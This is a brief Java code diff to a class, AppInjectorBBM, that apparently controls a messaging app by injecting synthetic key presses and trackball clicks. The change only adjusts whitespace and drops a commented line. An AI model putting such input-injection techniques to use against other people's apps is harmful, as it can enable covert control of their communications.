@@ -92,7 +92,7 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
             }
             return false;
         }
-        
+
         //#ifdef DEBUG
         debug.trace("callMenuByKey press raw key");
         //#endif
@@ -101,7 +101,6 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
         KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
         Utils.sleep(delay + tries * 20);
         KeyInjector.trackBallRawClick();
-        //KeyInjector.trackBallClick();
 
         return true;
     }
